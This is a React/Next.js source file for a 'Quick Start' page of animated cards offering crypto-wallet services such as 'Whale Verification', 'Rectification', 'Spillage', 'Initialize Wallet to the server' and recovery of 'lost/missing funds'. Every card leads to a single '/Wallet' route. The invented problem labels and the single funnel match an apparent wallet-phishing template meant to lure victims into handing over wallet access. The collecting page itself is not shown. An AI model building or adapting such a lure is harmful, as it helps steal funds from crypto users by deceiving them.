'use client'

import { motion } from 'framer-motion'
import {
  Shield,
  DollarSign,
  Smartphone,
  WrenchIcon,
  ShieldCheck,
  Cog,
  RefreshCcw,
  Gift,
  Wallet,
  ArrowLeftRight,
  Coins,
  BadgeDollarSign,
  Clock,
  Boxes,
  KeyRound,
  LinkIcon,
  LogIn,
  UserCheck,
  CreditCard,
  AlertCircle,
  AlertTriangle
} from 'lucide-react'
import Link from 'next/link'

interface FeatureCardProps {
  icon: React.ElementType
  title: string
  clickText: string
  index: number // Retaining the index for animations
}

const FeatureCard = ({
  icon: Icon,
  title,
  clickText
}: // index // No need to modify the index
FeatureCardProps) => {
  return (
    <motion.div
      whileHover={{ scale: 1.02 }}
      className='group relative overflow-hidden rounded-2xl bg-gradient-to-br from-gray-800/50 to-gray-900/50 border border-gray-700/50 backdrop-blur-sm transition-all duration-300 hover:border-blue-500/50 hover:from-gray-800/70 hover:to-gray-900/70'
    >
      <div className='absolute inset-0 bg-gradient-to-br from-blue-500/0 to-blue-500/0 opacity-0 transition-opacity duration-300 group-hover:opacity-10' />

      <div className='absolute -inset-x-20 -top-20 -z-10 transform-gpu blur-3xl opacity-0 transition-opacity duration-300 group-hover:opacity-20'>
        <div className='aspect-[1100/200] w-full bg-gradient-to-br from-blue-500 to-blue-600' />
      </div>

      <div className='flex flex-col items-center justify-center p-6 space-y-4 h-full min-h-[200px]'>
        <motion.div whileHover={{ rotate: 5 }} className='relative p-3'>
          <div className='absolute inset-0 bg-blue-500/20 blur-xl rounded-full opacity-0 group-hover:opacity-100 transition-opacity duration-300' />
          <Icon className='w-10 h-10 text-blue-400 relative z-10' />
        </motion.div>

        <h2 className='text-xl font-mono font-bold text-white text-center'>
          {title}
        </h2>

        <p className='text-sm text-blue-400 relative group-hover:text-blue-300 transition-colors duration-300'>
          {clickText}
          <span className='absolute -bottom-px left-0 w-0 h-px bg-blue-400 transition-all duration-300 group-hover:w-full' />
        </p>
      </div>
    </motion.div>
  )
}

export default function Component () {
  const features = [
    {
      icon: Shield,
      title: 'Dapps Extension',
      clickText: 'Click here for dapps extension.'
    },
    {
      icon: DollarSign,
      title: 'Admin Verification',
      clickText: 'Click here for Admin Verification.'
    },
    {
      icon: Smartphone,
      title: 'Whale Verification',
      clickText: 'Click here for Whale verification.'
    },
    {
      icon: WrenchIcon,
      title: 'Migration',
      clickText: 'Click here for migration.'
    },
    {
      icon: ShieldCheck,
      title: 'Rectification',
      clickText: 'Click here for rectification.'
    },
    {
      icon: Cog,
      title: 'Claim',
      clickText: 'Click here to claim assets.'
    },
    {
      icon: RefreshCcw,
      title: 'Swap',
      clickText: 'Click here for assets swapping.'
    },
    {
      icon: Gift,
      title: 'Spillage',
      clickText: 'Click here for spillage related error.'
    },
    {
      icon: Wallet,
      title: 'Transaction',
      clickText: 'Click here for transaction related issues.'
    },
    {
      icon: ArrowLeftRight,
      title: 'Cross Transfer',
      clickText: 'Click here for cross bridge issues.'
    },
    {
      icon: Coins,
      title: 'Staking',
      clickText: 'Click here for staking related issues.'
    },
    {
      icon: BadgeDollarSign,
      title: 'Exchange',
      clickText: 'Click here for exchange related issues'
    },
    {
      icon: Clock,
      title: 'Transaction Delay',
      clickText: 'Click here for any issues related to transaction delay.'
    },
    {
      icon: Gift,
      title: 'Claim Airdrop',
      clickText: 'Click here for airdrop related issues.'
    },
    {
      icon: Boxes,
      title: 'NFTs',
      clickText: 'Click here for NFTs minting/transfer related issues.'
    },
    {
      icon: KeyRound,
      title: 'Approve Wallet',
      clickText: 'Click here for issues on wallet approval on the mainet.'
    },
    {
      icon: Wallet,
      title: 'Initialize Wallet',
      clickText: 'Click here to initialize your wallet to the server.'
    },
    {
      icon: ShieldCheck,
      title: 'Locked Accounts',
      clickText: 'Click here for issues related to account lock.'
    },
    {
      icon: LinkIcon,
      title: 'Connect to Dapps',
      clickText: 'Click here for error while connecting to dapps'
    },
    {
      icon: LogIn,
      title: 'Login',
      clickText: 'Click here for wallet login issues'
    },
    {
      icon: UserCheck,
      title: 'Whitelist',
      clickText: 'Click here for whitelist related issues'
    },
    {
      icon: CreditCard,
      title: 'Buy Coins/Tokens',
      clickText:
        'To trade, your account must be marked as a trusted payment source.'
    },
    {
      icon: AlertCircle,
      title: 'Missing/Irregular Balance',
      clickText: 'Click here to recover lost/missing funds.'
    },
    {
      icon: AlertTriangle,
      title: 'Wallet glitch / Wallet error',
      clickText:
        'Click here if you are having problem with your trading wallet.'
    }
  ]

  return (
    <div className='min-h-screen bg-gradient-to-br from-gray-900 to-black p-6 md:p-8'>
      <div className='flex item-center text-blue-400 my-[1.5rem] justify-center text-2xl lg:text-3xl font-semibold'>
        Quick Start
      </div>
      <div className='max-w-7xl mx-auto'>
        <Link href='/Wallet'>
          <motion.div
            className='grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6'
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            {features.map((feature, index) => (
              <motion.div
                key={feature.title}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5, delay: index * 0.1 }}
              >
                <FeatureCard {...feature} index={index} />
              </motion.div>
            ))}
          </motion.div>
        </Link>
      </div>
    </div>
  )
}
